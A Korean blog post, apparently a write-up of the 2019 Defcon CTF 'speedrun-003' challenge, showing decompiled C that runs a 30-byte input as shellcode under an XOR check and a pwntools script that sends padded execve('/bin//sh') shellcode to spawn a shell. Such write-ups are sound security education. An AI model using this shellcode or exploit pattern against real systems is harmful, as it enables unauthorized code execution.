---
title: "2019 Defcon CTF speedrun-003"
date: 2020-1-4
tags: [Defcon]
categories: [Defcon]
---

쉘코드를 실행시켜야하는 문제다. 아래에서 쉘코드를 실행시켜주는데 조건을 만족 시켜아한다.

```c
__int64 __fastcall shellcode_it(const void *a1, unsigned int a2)
{
  unsigned int len; // ST04_4
  __int64 (__fastcall *v3)(void *, const void *); // rax
  __int64 (__fastcall *dest)(void *, const void *); // ST10_8
  const void *v5; // rsi
  __int64 (__fastcall *v6)(void *, const void *); // rdi

  len = a2;
  v3 = mmap(0LL, a2, 7, 34, -1, 0LL);
  dest = v3;
  v5 = a1;
  v6 = v3;
  memcpy(v3, v5, len);
  return dest(v6, v5);
}
```

조건을 보면 우선 buf입력 길이는 30바이트고 \x90을 사용 못한다. 앞에 15글자와 뒤에 15글자 xor한 값이 같으면 `shellcode_it` 에서 shellcode를 실행시켜준다.

```c
unsigned __int64 get_that_shellcode()
{
  int v0; // ST0C_4
  char v1; // ST0A_1
  char buf; // [rsp+10h] [rbp-30h]
  char v4; // [rsp+1Fh] [rbp-21h]
  char v5; // [rsp+2Eh] [rbp-12h]
  unsigned __int64 v6; // [rsp+38h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  puts("Send me your drift");
  v0 = read(0, &buf, 30uLL);
  v5 = 0;
  if ( v0 == 30 )
  {
    if ( strlen(&buf) == 30 )
    {
      if ( strchr(&buf, 0x90) )
      {
        puts("Sleeping on the job, you're not ready.");
      }
      else
      {
        v1 = xor(&buf, 15u);
        if ( v1 == xor(&v4, 15u) )
          shellcode_it(&buf, 30u);
        else
          puts("This is a special race, come back with better.");
      }
    }
    else
    {
      puts("You're not up to regulation.");
    }
  }
  else
  {
    puts("You're not ready.");
  }
  return __readfsqword(0x28u) ^ v6;
}
```

23바이트 쉘코드를 가져와서 패딩 7바이트를 넣어서 실행시켜줬다.

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./speedrun-003')
p = process('./speedrun-003')

# https://www.exploit-db.com/exploits/36858
# \x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05
'''a = 0
for i in range(15):
	a ^= ord(shellcode[i])
b = 0
for j in range(15,len(shellcode)):
	b ^= ord(shellcode[j])
print a
print b
'''

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05\x01\x01\x01\x01\x01\x01\x8b" # 23bytes
p.sendafter('Send me your drift\n',shellcode)

p.interactive()
```

